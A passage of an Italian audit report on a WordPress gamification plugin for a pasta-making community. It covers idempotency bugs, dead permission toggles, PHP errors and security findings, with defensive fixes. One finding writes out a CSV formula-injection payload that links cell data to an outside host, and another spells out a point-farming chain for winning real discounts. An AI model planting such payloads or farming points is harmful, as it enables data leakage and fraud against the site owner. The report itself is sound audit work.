`gs_abbonamento_avviso_per` è per utente e viene scritto subito dopo l'invio, riga 139.
È l'unico dei cron del plugin già scritto bene.

## B1 · Premi di sfida assegnati due volte

**File:** `includes/voting.php:612-633` (`gs_close_expired_challenges()`) — VERIFICATO

```php
gs_award_challenge_prizes( $sfida->ID );          // riga 631 — assegna 100/60/30 punti alle prime tre
update_post_meta( $sfida->ID, 'gs_chiusa', 1 );   // riga 632 — la protezione, DOPO
```

Se il processo muore tra la riga 631 e la 632 (o dentro `gs_award_challenge_prizes()`,
che chiama `gs_add_points()` tre volte e lancia `do_action( 'gs_podio_sfida' )` — il
quale a sua volta sblocca badge, che assegnano altri punti, che possono far salire di
livello, che consegnano premi), il giorno dopo la sfida viene richiusa e **i premi
vengono assegnati di nuovo**. `gs_add_points()` non ha alcun controllo di doppione.

**Correzione:** invertire le due righe. `update_post_meta( $sfida->ID, 'gs_chiusa', 1 )`
**prima** di `gs_award_challenge_prizes()`. Nel peggiore dei casi si perde
un'assegnazione (recuperabile a mano dal pannello "Correggi punti") invece di
raddoppiarla (che nessuno si accorge).

## B2 · Token rimborsati due volte

**File:** `includes/token.php:279-334` (`gs_token_controlla_rimborsi()`) — VERIFICATO

Dentro una conversazione con più domande scadute:

```php
gs_token_movimento( $sfoglina, (int) $m['token_costo'], 'rimborso', ... );  // riga 316 — accredita
$msgs[ $i ]['rimborsato'] = true;                                          // riga 317 — solo in memoria
$cambiato = true;
// ... altre domande, altri accrediti ...
if ( $cambiato ) { update_post_meta( $c->ID, 'gs_msgs', $msgs ); }          // riga 331 — scrive alla fine
```

Se il ciclo muore dopo tre accrediti, **nessuno** dei tre flag `rimborsato` viene
salvato: il giorno dopo tutti e tre vengono riaccreditati. I token sono crediti che si
comprano: è denaro.

**Correzione:** salvare il flag subito dopo ogni singolo rimborso, prima di passare al
messaggio successivo:

```php
$msgs[ $i ]['rimborsato'] = true;
update_post_meta( $c->ID, 'gs_msgs', $msgs );   // subito, non alla fine
gs_token_movimento( $sfoglina, (int) $m['token_costo'], 'rimborso', ... );
```

Nota: scrivere prima e accreditare dopo. Costa una scrittura in più per rimborso
(rarissimi), ed elimina il doppio accredito.

## B3 · Aeroplanini di compleanno mandati due volte a tutte

**File:** `includes/compleanni.php:107-130` (`gs_bday_annuncio_giornaliero()`) — VERIFICATO

Doppio ciclo *festeggiate × tutte le sfogline*, con `gs_accoda_volo()` per ogni coppia
(riga 125), e `update_option( 'gs_bday_annuncio_data', $oggi )` **solo alla riga 129**.
Con 200 sfogline e 2 compleanni sono 400 accodamenti in una richiesta. Se muore a metà,
il giorno dopo tutte quelle già avvisate ricevono di nuovo l'aeroplanino.

**Correzione:** spostare `update_option( 'gs_bday_annuncio_data', $oggi )` **prima** del
doppio ciclo. Nel peggiore dei casi qualche sfoglina non vede l'aeroplanino, invece di
vederlo due volte.

## B4 · Email del Premio di Fine Anno mandate due volte

**File:** `includes/year-prize.php:52-98` (`gs_assign_year_prize()`) — VERIFICATO

`update_option( 'gs_year_prize_assigned_' . $year, ... )` è alla riga 95, dopo il ciclo
sulle vincitrici. Il badge è protetto da `in_array()` (riga 65), ma l'email (riga 78) e
l'aeroplanino (riga 85) no. In più, **la funzione non controlla `gs_year_prize_assigned()`
all'inizio**: chi la richiama dal pannello (`includes/control-panel.php:1172`,
`includes/admin.php:904`) può rimandare tutte le email cliccando due volte.

**Correzione:** all'inizio della funzione,
`if ( gs_year_prize_assigned( $year ) ) { return array(); }`, e spostare
`update_option()` prima del ciclo. Impatto minore delle altre (le vincitrici sono
poche), ma è la stessa correzione e costa due righe.

## B5 · La salita di livello può scattare due volte — e ora questo costa soldi

**File:** `includes/points.php:28-33` (commento), `includes/points.php:112-116`
(`do_action( 'gs_level_up' )`), `includes/premi-traguardi.php:165-170`
(`gs_premio_su_livello()`) — VERIFICATO

Il commento in `points.php` riga 28-33 dichiara che la lettura di `$old_total` non è
protetta da corse e che, con due assegnazioni quasi simultanee, l'evento "sei salita di
livello" **può scattare due volte** — definendolo *"fastidioso ma innocuo"*.

**Non è più innocuo.** Da quando esistono i Premi per Traguardo di tipo "sconto"
(`includes/premi-traguardi.php:107-109`), `gs_level_up` consegna percentuali di sconto
vere tramite `gs_sconto_aggiungi()`. Due eventi di livello = **due volte lo sconto**.

**Correzione:** rendere la consegna del premio idempotente per (premio, utente), che è
più semplice e più solido che eliminare la corsa in `gs_add_points()`:

```php
function gs_premio_consegna( $premio_id, $user_id ) {
    $gia = get_user_meta( $user_id, 'gs_premio_consegnato_' . (int) $premio_id, true );
    if ( $gia ) { return false; }
    update_user_meta( $user_id, 'gs_premio_consegnato_' . (int) $premio_id, 1 );
    // ... corpo attuale ...
}
```

E **aggiornare il commento in `points.php:28-33`**, che oggi dice il falso.

## B6 · Un salto di due livelli salta il premio intermedio

**File:** `includes/premi-traguardi.php:166-170` — VERIFICATO

```php
function gs_premio_su_livello( $user_id, $new_level, $old_level ) {
    foreach ( gs_premi_per_livello( $new_level ) as $c ) { ... }   // solo $new_level
}
```

`$old_level` è nella firma ma non viene usato. Una correzione manuale di punti dal
pannello, o un premio di sfida grosso, possono far salire di due livelli in un colpo:
i premi impostati per il livello intermedio **non vengono mai consegnati, e nessuno se
ne accorge**.

**Correzione:**

```php
for ( $liv = (int) $old_level + 1; $liv <= (int) $new_level; $liv++ ) {
    foreach ( gs_premi_per_livello( $liv ) as $c ) {
        gs_premio_consegna( $c['id'], $user_id );
    }
}
```

Da applicare **dopo** B5, altrimenti moltiplica il problema invece di risolverlo.

---

# BLOCCO C — Attività programmate che possono non scattare mai

WP-Cron **non è un vero cron**: scatta solo quando qualcuno visita il sito. Un compito
che controlla una data precisa e, se salta quella finestra, non si recupera mai, è un
compito che prima o poi non verrà eseguito.

## C1 · La chiusura del mese ha una sola giornata utile al mese

**File:** `includes/buono-sfoglia.php:126-132` — VERIFICATO

```php
if ( '01' !== date( 'd', current_time( 'timestamp' ) ) ) { return; }
```

Se il 1° del mese il sito ha poco traffico e il cron non parte in quella finestra, la
chiusura del mese **non avviene, e non avverrà mai più** per quel mese: nessun Buono
assegnato, nessun resoconto inviato, e nessuno se ne accorge.

**Correzione:** togliere il controllo sulla data e usare quello sullo stato, **che è già
lì** (`gs_buono_sfoglia_mese_chiuso`). Il cron gira ogni giorno e chiede: *"c'è un mese
finito e non ancora chiuso?"* Se sì, lo chiude — che sia il 1° o il 7.

```php
function gs_buono_sfoglia_controlla_chiusura_mese() {
    $mese_scorso = date( 'Y-m', strtotime( 'first day of last month', current_time( 'timestamp' ) ) );
    if ( get_option( 'gs_buono_sfoglia_mese_chiuso' ) === $mese_scorso ) { return; }
    gs_buono_sfoglia_chiudi_mese( $mese_scorso );
}
```

**Dettaglio collegato, importante:** con il controllo sulla data rimosso,
`strtotime( '-1 month' )` (riga 71) **smette di essere sicuro** — il 31 marzo meno un
mese dà il 3 marzo. Calcolare il mese precedente con
`date( 'Y-m', strtotime( 'first day of last month', current_time( 'timestamp' ) ) )`,
come sopra. Questa riga va corretta **anche dentro `gs_buono_sfoglia_chiudi_mese()`**.

## C2 · La scadenza annuale ha una sola giornata utile in tutto l'anno

**File:** `includes/buono-sfoglia.php:216-222` — VERIFICATO

```php
if ( date( 'm-d', $oggi ) !== '02-01' ) { return; }
```

Un solo giorno all'anno. Se il cron non parte quel giorno, i Buoni non scadono **per
tutto l'anno successivo**, e si sommano a quelli nuovi.

**Correzione:** stessa logica di C1 — usare `gs_buono_sfoglia_scaduto_anno` come stato e
far scattare la scadenza **dal 1° febbraio in poi**:

```php
if ( date( 'm-d', $oggi ) < '02-01' ) { return; }
$anno = date( 'Y', $oggi );
if ( get_option( 'gs_buono_sfoglia_scaduto_anno' ) === $anno ) { return; }
```

## C3 · Il reset annuale degli sconti ha otto giorni utili

**File:** `includes/sconto-corsi.php:137-159` — VERIFICATO. Stessa famiglia, meno grave.

```php
if ( date( 'm-d', $oggi ) < '12-24' ) { return; }
```

Il confronto tra stringhe apre una finestra dal 24 al 31 dicembre — otto giorni invece
di uno, quindi è già scritto meglio di C1 e C2. Ma se il cron non parte in quegli otto
giorni (periodo di festa, traffico basso), lo sconto non si azzera più.

**Correzione:** stessa forma di C2 — lo stato `gs_sconto_reset_anno` c'è già, basta far
scattare il reset da 12-24 in poi *fino al 23 dicembre dell'anno dopo*, cioè controllare
solo lo stato e non la data superiore. Priorità bassa: la finestra di otto giorni rende
il caso improbabile.

## C4 · Il promemoria "il corso è domani" scrive il marcatore dopo il ciclo

**File:** `includes/calendario.php:1632-1665` — VERIFICATO

```php
foreach ( gs_cal_prenotazioni( $corso_post->ID, ... ) as $p ) {
    ... wp_mail / gs_mail_progetto ...            // righe 1657-1661
}
update_post_meta( $corso_post->ID, 'gs_promemoria_inviato', 1 );   // riga 1663, dopo
```

Qui **non c'è doppio invio** (la query cerca i corsi di *domani*: il giorno dopo il corso
non è più "domani"), ma c'è **perdita silenziosa**: se il ciclo muore a metà, gli
iscritti rimanenti non ricevono mai il promemoria e nessuno lo sa.

**Correzione:** marcatore per prenotazione invece che per corso —
`update_post_meta( $p->ID, 'gs_promemoria_inviato', 1 )` subito dopo l'invio a quella
persona, e saltare chi ce l'ha già. Così una ripresa completa il giro.

**Nota:** la stessa forma è in `includes/lezioni-video.php:248-291`
(`gs_lezioni_promemoria_non_viste()`), dove i flag `promemoria_inviato` sono messi in
memoria e salvati con `update_post_meta` solo a fine lezione (riga 288). Lì l'effetto è
un promemoria doppio, non perso. Stessa correzione, priorità più bassa.

---

# BLOCCO D — Coerenza interna: interruttori che non fanno niente

Il briefing precedente chiedeva: *"quali chiavi di permesso sono usate ma non registrate
in `gs_sez_registry()`, e quali funzioni `gs_pannello_*` sono richiamate ma non esistono
più"*. Ecco la risposta completa. **Sono stati incrociati tutti e quattro gli elenchi**
(`gs_sez_registry()` in `sezioni.php`, `gs_pn_sezioni()` in `pannello-nuovo.php`,
`control-panel.php`, `admin.php`).

## D0 · Buona notizia — nessuna funzione fantasma

**VERIFICATO:** tutti i 71 callback `'cb'` di `gs_pn_sezioni()` e tutte le funzioni
`gs_pannello_*` / `gs_pn_render_*` richiamate in `control-panel.php` e `admin.php`
**esistono davvero**. Nessuna sezione invisibile per callback mancante. Nessun intervento.

## D1 · Cinque chiavi di permesso usate ma mai registrate

**Stato:** VERIFICATO

| Chiave | Usata in | Pannello |
|---|---|---|
| `regia_iscritti` | `pannello-nuovo.php:56`, `control-panel.php:65`, `admin.php` | Lista degli Iscritti ai Corsi |
| `ingrediente_segreto` | `pannello-nuovo.php`, `control-panel.php:160`, `admin.php` | Ingrediente Segreto |
| `artigiani` | `pannello-nuovo.php`, `admin.php` | Artigiani della Pasta |
| `scuole` | `pannello-nuovo.php`, `admin.php` | Scuole di Cucina |
| `giudici_gara` | `pannello-nuovo.php`, `control-panel.php`, `admin.php` | Sfogline in gara — giudici |

Il codice chiama `gs_sez_zona_ok( 'artigiani' )`, ma `'artigiani'` non è in
`gs_sez_registry()`. Conseguenza: `gs_sez_visibile()` fa `empty( $h[ $key ] )` su una
chiave che non esiste → **restituisce sempre `true`**, e `gs_sez_collab_ok()` con lista
vuota → **sempre `true`**.

**In pratica: questi cinque pannelli sono sempre visibili a tutti i collaboratori, e
il titolare non ha alcun modo di nasconderli o di assegnarli per nome**, perché non
compaiono nella tabella "Visibilità delle sezioni e permessi". Non è un errore che si
vede: è un permesso che non si può mettere. Fra questi ci sono la Lista degli Iscritti
ai Corsi (scheda a 360° di ogni persona) e i due pannelli partner, che gestiscono
abbonamenti a pagamento.

**Correzione:** aggiungere le cinque voci a `gs_sez_registry()` in
`includes/sezioni.php`, nel blocco dei pannelli senza pagina pubblica (dopo riga 68):

```php
'regia_iscritti'      => array( 'label' => 'Lista degli Iscritti ai Corsi', 'page' => '', 'sc' => array(), 'zona' => true, 'livello' => 'base' ),
'ingrediente_segreto' => array( 'label' => 'Ingrediente Segreto',           'page' => '', 'sc' => array(), 'zona' => true, 'livello' => 'base' ),
'artigiani'           => array( 'label' => 'Artigiani della Pasta',         'page' => '', 'sc' => array(), 'zona' => true, 'livello' => 'base' ),
'scuole'              => array( 'label' => 'Scuole di Cucina',              'page' => '', 'sc' => array(), 'zona' => true, 'livello' => 'base' ),
'giudici_gara'        => array( 'label' => 'Sfogline in gara — giudici',    'page' => '', 'sc' => array(), 'zona' => true, 'livello' => 'base' ),
```

**Compromesso da dichiarare:** dopo questa aggiunta il comportamento non cambia
(nessuna chiave nascosta, nessuna lista collaboratori impostata → tutto resta visibile
come oggi), ma il titolare **inizia a vedere cinque righe nuove** nella tabella
Visibilità. Va avvisato, altrimenti pensa che siano funzioni nuove.

## D2 · Tre interruttori "Visibile" che non spengono niente

**Stato:** VERIFICATO

`gs_sez_registry()` registra `aeroplanino` (riga 116), `palloncini` (117) e
`palloncino_gigante` (118), tutti con `'page' => ''` e `'sc' => array()`. Il testo del
pannello promette: *"Per i pannelli senza una pagina pubblica propria l'interruttore
«Visibile» spegne l'intero strumento"*.

**Nessuna di queste tre chiavi compare in una sola chiamata `gs_sez_*()` in tutto il
plugin.** Il pannello che le contiene è `gs-zona-in-diretta`
(`pannello-nuovo.php:67`), registrato con `'sez' => ''` — cioè senza controllo — e
richiamato senza controllo anche in `control-panel.php:92` e `admin.php:273`.

**Spegnere quei tre interruttori non fa assolutamente niente.**

**Correzione:** in `includes/volo-notifiche.php`, dentro `gs_pannello_in_diretta()`
(riga 89), far dipendere ogni linguetta dalla propria chiave — cosa che il commento
alle righe 84-86 dello stesso file **dichiara già di fare**, ma che non è implementata:

```php
$mostra_aereo = ! function_exists( 'gs_sez_zona_ok' ) || gs_sez_zona_ok( 'aeroplanino' );
$mostra_pall  = ! function_exists( 'gs_sez_zona_ok' ) || gs_sez_zona_ok( 'palloncini' );
$mostra_pg    = ! function_exists( 'gs_sez_zona_ok' ) || gs_sez_zona_ok( 'palloncino_gigante' );
if ( ! $mostra_aereo && ! $mostra_pall && ! $mostra_pg ) { return; }
```

e saltare la linguetta e il corpo corrispondenti. Va corretto **anche il commento**
alle righe 84-86, che oggi descrive un comportamento che non c'è.

## D3 · Tre caselle del Nastro delle Vetrine salvate e mai lette

**Stato:** VERIFICATO

`includes/caroselli.php:411-413` disegna tre caselle — **Sfogline**, **Scuole**,
**Negozi (Artigiani della Pasta)** — e `caroselli.php:489-491` le salva.
`nastro-vetrine.php:30-32` le rilegge in `gs_nastro_impostazioni()`.

**`gs_nastro_raccogli_voci()` (riga 132) non le consulta mai.** Legge solo
`nastro_esclusi_sfogline` / `_artigiani` / `_scuole`. Togliere la spunta a "Scuole"
non cambia nulla sul sito.

**Correzione:** in `gs_nastro_raccogli_voci()`, saltare i tre gruppi quando spenti:

```php
$sfogline = array();
if ( ! empty( $esclusi['nastro_mostra_sfogline'] ) ) {
    foreach ( get_users( ... ) as $u ) { ... }
}
// idem per artigiani (nastro_mostra_negozi) e scuole (nastro_mostra_scuole)
```

**Bonus:** questa correzione riduce anche il costo di A3 quando un gruppo è spento.
Farla **dopo** A3, non prima, per non toccare due volte la stessa funzione.

## D4 · Quattordici chiavi registrate ma di significato diverso da quello atteso

**Stato:** VERIFICATO — **non richiede correzione, ma va detto a Ennio**

Queste chiavi non compaiono in nessuna chiamata `gs_sez_zona_ok()` diretta:
`anno_fa_oggi`, `consigli`, `diario`, `messaggi`, `percorso_personale`, `promemoria`,
`riepilogo_anno`, `stagionale`, `testamenti`, `traguardi`, `vetrina`.

**Funzionano lo stesso**, tramite il filtro `gs_sez_filtra_shortcode()`
(`sezioni.php:197-211`), che blocca lo shortcode della pagina. Nessun intervento.

Le uniche tre veramente morte sono quelle di D2.

---

# BLOCCO E — Bug puntuali verificati

## E1 · Variabile non definita: l'avviso "Corso bloccato" arriva senza titolo

**File:** `includes/calendario.php:779` — VERIFICATO, **nuovo**

```php
function gs_ajax_cal_blocca_corso() {
    gs_cal_guard();
    $id     = ...;
    $motivo = ...;
    // $corso NON viene mai definito in questa funzione
    gs_inbox_crea( 'Corso bloccato: ' . $corso['titolo'], ... );   // riga 779
}
```

`$corso` non esiste. In PHP 8 questo produce due avvisi
(*Undefined variable $corso*, *Trying to access array offset on value of type null*) e
il titolo del messaggio in Posta interna diventa `"Corso bloccato: "`, senza nome.

**Peggio:** siamo dentro un handler AJAX che poi chiama `wp_send_json_success()`. Se sul
server `display_errors` è acceso, gli avvisi finiscono **dentro il corpo della risposta**,
prima del JSON, e il client non riesce più a interpretarla: il pannello mostra un errore
generico anche se il corso è stato bloccato correttamente.

**Correzione (una riga):**

```php
$corso = gs_cal_corso_get( $id );
```

subito dopo il controllo su `get_post_type( $id )`, riga 773.

## E2 · `esc_url()` dentro una risposta JSON

**File:** `includes/classifica-mensile.php:73` — VERIFICATO (già segnalato)

Il link passa da `esc_url()`, che è l'escape **per l'HTML**: in una risposta JSON
le `&` arrivano al client come `&amp;`.

**Correzione:** `esc_url_raw()`. Stessa cosa da controllare in
`includes/helpers.php` per `gs_vetrina_url()` se il valore finisce in altri JSON.

## E3 · Voci di storico senza tipo → avviso PHP in mezzo alla pagina

**File:** `includes/buono-sfoglia.php:271-273` — VERIFICATO (già segnalato)

```php
$tipo = isset( $etichette[ $voce['tipo'] ] ) ? ... : $voce['tipo'];
... number_format( (float) $voce['percentuale'], 1 ) ...
```

`$voce['tipo']` e `$voce['percentuale']` sono letti senza `isset`: una voce malformata
genera un avviso PHP nel mezzo di "La Mia Sfoglia".

**Correzione:**
```php
$t   = isset( $voce['tipo'] ) ? $voce['tipo'] : '';
$pct = isset( $voce['percentuale'] ) ? (float) $voce['percentuale'] : 0;
$tipo = isset( $etichette[ $t ] ) ? $etichette[ $t ] : $t;
```

## E4 · Buono applicato due volte sporca lo storico

**File:** `includes/buono-sfoglia.php:196-210` (`gs_buono_sfoglia_applica()`) — VERIFICATO (già segnalato)

Azzera la percentuale senza controllare che fosse maggiore di zero: un doppio clic del
gestore scrive una seconda voce "usato 0%" nello storico. Innocuo ma sporca il registro.

**Correzione:** `if ( $pct_usata <= 0 ) { return false; }` prima dell'azzeramento.
**Applicare insieme ad A2**, che è la stessa correzione sull'altro sistema di sconti,
lì con conseguenze serie.

## E5 · Dopo 24 ore la scheda aperta smette di ricevere notifiche, in silenzio

**File:** `assets/js/gaming.js` — tutti i blocchi di polling (6572, 6599, 6649, 6671, 7048, 7448, 8203) — VERIFICATO

Il nonce `gs_ajax` viene creato a caricamento pagina (`gaming-sfogline.php:551`) e
scade dopo 24 ore. Da quel momento `check_ajax_referer()` risponde 403 a ogni richiesta.
**Tutte le chiamate usano solo `.done()`, nessuna ha un `.fail()`**: il fallimento è
completamente silenzioso. Una scheda lasciata aperta due giorni continua a interrogare
il server 1.200 volte l'ora ottenendo solo 403, senza mostrare più nulla e senza che
nessuno se ne accorga.

**Correzione:** aggiungere un `.fail()` all'endpoint unificato di A5 che, sul secondo
403 consecutivo, ferma gli intervalli e mostra un avviso discreto
*"La sessione è scaduta — ricarica la pagina"*. Da fare **insieme ad A5**, sull'endpoint
unico, non sei volte.

## E6 · L'esportazione CSV non protegge dalle formule di Excel

**File:** `includes/export-dati.php:133-141` (`gs_export_csv_string()`) — VERIFICATO, severità bassa

`fputcsv()` non neutralizza le celle che iniziano per `=`, `+`, `-`, `@`. Una sfoglina
che imposta il proprio nome visualizzato o la biografia come
`=HYPERLINK("http://…"&A1,"Clicca")` fa eseguire quella formula quando il titolare apre
il CSV in Excel.

**Correzione:** anteporre un apostrofo alle celle sospette:

```php
foreach ( $rows as $r ) {
    $r = array_map( function ( $v ) {
        $v = (string) $v;
        return ( '' !== $v && strpos( "=+-@\t\r", $v[0] ) !== false ) ? "'" . $v : $v;
    }, $r );
    fputcsv( $out, $r, ';' );
}
```

Richiede che l'attaccante sia una sfoglina registrata e che il titolare apra il file e
accetti l'avviso di Excel: severità bassa, correzione da tre righe.

---

# BLOCCO F — Sicurezza sfruttabile: cosa è stato verificato

Il briefing chiedeva la catena completa per ogni segnalazione, e di dire chiaramente
quando una cosa è "da verificare" invece di presentarla come certa. Ecco entrambe le liste.

## F0 · Cosa è risultato PULITO (verificato, nessun intervento)

Questo è il risultato più importante del blocco, ed è buono:

- **342 endpoint AJAX distinti.** Incrociando ogni `add_action( 'wp_ajax_… )` con il
  corpo del suo callback, **risolvendo anche i guard condivisi** (`gs_cal_guard()`,
  `gs_conv_guard()`, `gs_inbox_guard()`, `gs_pro_guard()`, `gs_regia_guard()`,
  `gs_esperto_guard()`, `gs_lettura_guard()`): **tutti hanno un controllo di nonce e un
  controllo di capacità o di proprietà adeguato al loro scopo.** Nessun endpoint di
  scrittura raggiungibile senza permesso. Non è un risultato scontato su 342 endpoint.
- **9 endpoint `nopriv`** (`gs_registrati`, `gs_registrati_lettore`, `gs_login`,
  `gs_password_dimenticata`, `gs_password_reimposta`, `gs_newsletter_iscrivi`,
  `gs_art_contatta`, `gs_scu_contatta`, `gs_classifica_mensile_dati`): tutti **devono**
  essere pubblici per funzionare, tutti verificano il nonce, e i primi otto passano da
  `gs_antispam_check()`. L'unico problema è il **carico** di `gs_classifica_mensile_dati`
  (A4), non l'accesso.
- **Nessun `register_rest_route()` in tutto il plugin.** Niente da esporre su `/wp-json/`.
- **Tutti i CPT che contengono dati privati sono `'public' => false`**: `gs_diario`,
  `gs_conversazione`, `gs_messaggio`, `gs_msg_interno`, `gs_tavolo`, `gs_voce`,
  `gs_domanda`, `gs_ricetta`, `gs_locandina`, `gs_barometro`. `cpt.php:66-70` forza
  inoltre `show_in_rest => false` di default. Corretto.
- **Percorsi di upload** (`includes/media-msg.php:16-52`): il tipo è dedotto con
  `wp_check_filetype()` sull'**estensione reale**, non dall'header dichiarato dal browser,
  e l'upload passa da `media_handle_upload()`. Corretto.
- **`php -l` su tutti i 102 file PHP: nessun errore di sintassi.**

## F1 · IL problema economico vero: i punti del mese sono coltivabili

**Stato:** VERIFICATO — **questo è il rischio di sicurezza più concreto del plugin**

Non è una vulnerabilità tecnica, è un problema di regole. Dal 19-20/08/2026 i punti del
mese **valgono soldi**: 2.500 punti in un mese = un Buono Sfoglia da 2,5% su un corso vero.

Le fonti di punti ripetibili a volontà non hanno alcun tetto giornaliero:

| Fonte | Punti | File | Limite |
|---|---|---|---|
| Voce di diario | 15 | `forms.php:56` | solo antispam |
| Consiglio condiviso | 20 | `forms.php:125` | solo antispam |
| Voto in un sondaggio | 5 | `sondaggi.php:240` | — |
| Proposta in un sondaggio | 10 | `sondaggi.php:280` | — |
| Auguri di compleanno | 5 | `compleanni.php:187` | solo antispam |

L'unico freno è `gs_antispam_rate_ok()` (`antispam.php:58-68`): **10 invii all'ora per
indirizzo IP e per contesto**, con `max_per_hour` = 10 di default
(`helpers.php:142`). Contesti diversi hanno contatori diversi.

**Catena completa:** una sfoglina approvata scrive 10 voci di diario all'ora (150 punti)
e 10 consigli all'ora (200 punti) = **350 punti l'ora**. La soglia di 2.500 si raggiunge
in **circa sette ore** di invii, ripetibili ogni mese. Le voci di diario sono
`post_status => 'private'`: **nessuno le vede mai**, quindi nessuno se ne accorge. Il
limite è per IP, non per utente: da rete mobile cambia da solo.

Non serve nessuna competenza tecnica: bastano dieci form compilati all'ora.

### Il vero problema non è che qualcuno bari: è che il gioco premia la cosa sbagliata

Confronto verificato sul codice, sorgente per sorgente.

**Quanto guadagna in un mese chi gioca davvero** (fonti già limitate a una volta al
giorno o per elemento — nessuna di queste è un problema):

| Attività | Punti | Quante volte al mese | Totale |
|---|---|---|---|
| Foto al Tavolo di Lavoro | 5 | 1/giorno, bloccato da `gs_tavolo_di_oggi()` | 150 |
| Indovina la Sfoglia | 5 | 1/giorno, bloccato da `gs_indovina_stato_oggi()` | 150 |
| Streak del matterello | 10 | 1/settimana | 40 |
| Sfoglia pubblicata in sfida | 20 | 1 per sfida, ~4 sfide | 80 |
| Voto dato a una sfoglia | 5 | quante sfoglie ci sono da votare | ~200 |
| Stelle ricevute | 1 per stella | quanto piace agli altri | 200-800 |
| Lezione video guardata | 5 | quante ne restano da vedere | ~50 |
| Podio di una sfida | 100 / 60 / 30 | se vince | 0-400 |

**Totale realistico: 700-900 punti** per una sfoglina attiva che non vince mai;
**1.800-2.500** per una che vince i podi ed è molto votata. *(Stima: gli ultimi tre
dipendono da quanto è grande la community, quindi vanno letti come ordine di grandezza.)*

**Quanto guadagna chi scrive e basta** (le uniche due fonti senza nessun limite per
persona — solo `gs_antispam_rate_ok()`, 10 invii l'ora **per indirizzo IP**):

| Attività | Punti | Limite reale | All'ora | Al mese, 6 al giorno |
|---|---|---|---|---|
| Voce di diario (`forms.php:56`) | 15 | 10/ora per IP | **150** | **2.700** |
| Consiglio (`forms.php:125`) | 20 | 10/ora per IP | **200** | 3.600 |

**Sei voci di diario al giorno per un mese fanno 2.700 punti: il Buono Sfoglia è vinto.**
E il Diario è `post_status => 'private'`: **nessuno le legge mai**, nemmeno il gestore, a
meno che non vada a cercarle apposta.

**Questa è l'inversione da correggere:** la soglia di 2.500 punti è *difficile* da
raggiungere cucinando, fotografando e partecipando, ed è *facile* da raggiungere
scrivendo in un quaderno privato. Non serve nessuna competenza tecnica, e non serve
nemmeno malafede: una sfoglina che tiene un diario davvero fitto vince il Buono senza
sapere di aver fatto niente di strano, e scavalca in classifica chi ha impastato.

### Correzione decisa (Ennio ha delegato la scelta, 22/08/2026)

**Una sola regola, la stessa che il plugin applica già a metà delle sue attività:
«ogni cosa dà punti una volta al giorno».**

È già così per il Tavolo di Lavoro e per l'Indovina. Va estesa alle due fonti scoperte,
e a nient'altro:

- **Voce di diario** — punti solo per la prima voce di ogni giornata (15 invece di 150/ora).
- **Consiglio** — punti solo per il primo di ogni giornata (20 invece di 200/ora).

Tutto il resto **non si tocca**: sfide, sondaggi, lezioni, badge, percorsi e streak sono
già limitati per natura (una volta per sfida, per sondaggio, per lezione).

**Non** si mette un tetto complessivo dentro `gs_add_points()`: taglierebbe anche i punti
meritati (podi, badge, correzioni manuali del gestore) e renderebbe imprevedibile un
motore che oggi è semplice. La regola sopra si dice in una frase alle sfogline; un tetto
globale no.

**Come scriverla** — un solo helper in `points.php`, riusato dalle due chiamate:

```php
/**
 * Vero se questa fonte di punti non è ancora stata usata oggi da questa
 * sfoglina. Segna subito l'uso: chiamarla due volte nello stesso giorno
 * restituisce false la seconda. Stessa regola già applicata al Tavolo di
 * Lavoro e all'Indovina, qui resa riusabile.
 */
function gs_punti_prima_volta_oggi( $uid, $fonte ) {
    $uid   = (int) $uid;
    $oggi  = date( 'Y-m-d', current_time( 'timestamp' ) );
    $chiave = 'gs_punti_' . sanitize_key( $fonte ) . '_giorno';
    if ( get_user_meta( $uid, $chiave, true ) === $oggi ) {
        return false;
    }
    update_user_meta( $uid, $chiave, $oggi );
    return true;
}
```

In `forms.php`, sostituire la riga 56:

```php
if ( gs_punti_prima_volta_oggi( $user_id, 'diario' ) ) {
    gs_add_points( $user_id, gs_get_points_value( 'voce_diario', 15 ), 'Voce di diario aggiunta' );
}
```

e la riga 125 allo stesso modo con `'consiglio'` e `gs_get_points_value( 'consiglio', 20 )`.

**Importante — il messaggio di risposta va cambiato con il codice.** Oggi entrambe le
funzioni rispondono sempre *"+15 punti!"* anche quando i punti non arriveranno più:
sarebbe una bugia detta dal sito. Le risposte vanno rese condizionali:

```php
$msg = $punti_dati
    ? 'Voce salvata nel tuo diario. +' . gs_get_points_value( 'voce_diario', 15 ) . ' punti!'
    : 'Voce salvata nel tuo diario. I punti del diario arrivano una volta al giorno: torna domani.';
```

**Il Diario resta libero:** si può continuare a scrivere quante voci si vuole, si salvano
tutte. Cambia solo che i punti arrivano una volta al giorno. Questo va detto esplicitamente
nel testo di aiuto della sezione.

### Conseguenza da tenere d'occhio: la soglia di 2.500 diventa severa

Con la regola applicata, il massimo mensile per una sfoglina che fa **tutto, ogni giorno**
diventa circa: 150 (Tavolo) + 150 (Indovina) + 450 (diario) + 600 (consigli) + 40 (streak)
+ 80 (sfide) + voti e stelle. **Siamo intorno ai 1.700 punti più le stelle ricevute.**

Cioè: 2.500 resta raggiungibile, ma solo facendo davvero tutto tutti i giorni ed essendo
apprezzate dalle altre. Per un premio è una soglia difendibile — ma è stretta.

**Non toccare la soglia adesso.** Applicare la regola, poi **guardare il primo mese vero**:
se non la raggiunge nessuna, abbassare la soglia (2.000 sembra il numero giusto) invece di
togliere i tetti. Il tetto protegge il senso del gioco; la soglia è solo un numero da
tarare, e va tarato su dati veri, non su questa stima.

### Da fare insieme: un allarme, non solo un divieto

Aggiungere al **Cruscotto della Verità** una riga che segnali chi ha superato, per
esempio, 200 punti in un giorno, con la fonte. Costa poco (i dati sono già in
`gs_log_points()`) e serve a due cose: vedere se qualcuno ci ha già provato **prima** che
il Buono di questo mese venga assegnato, e accorgersi in fretta se una fonte futura
riapre lo stesso buco. Il divieto chiude la porta, l'allarme fa vedere se qualcuno ci
aveva già bussato.

### Leva facoltativa, decisione di gioco e non tecnica

Un **Consiglio** vale 20 punti, quanto **pubblicare una sfoglia in una sfida** — che
richiede di impastare, tirare, fotografare. Scrivere due righe di consiglio e cucinare
non dovrebbero valere uguale. Portare il consiglio a 10 punti riequilibrerebbe, ma è una
scelta di gioco: **non farla senza che Ennio l'abbia chiesta esplicitamente.**

## F2 · CHIUSO — le foto non sono materiale riservato

> **Ennio, 22/08/2026: «le foto non sono cosa segreta».**
> **Questa è una risposta completa e chiude il punto.** Il lavoro grosso ipotizzato nella
> prima stesura — spostare gli allegati fuori da `uploads/` e servirli da un endpoint con
> controllo dei permessi — **non va fatto.** Non proporlo, non iniziarlo, non rimetterlo
> in lista a un giro successivo.

**Stato:** decisione presa. Resta solo del lavoro di parole, più una correzione facoltativa.

### Perché la risposta chiude davvero il punto

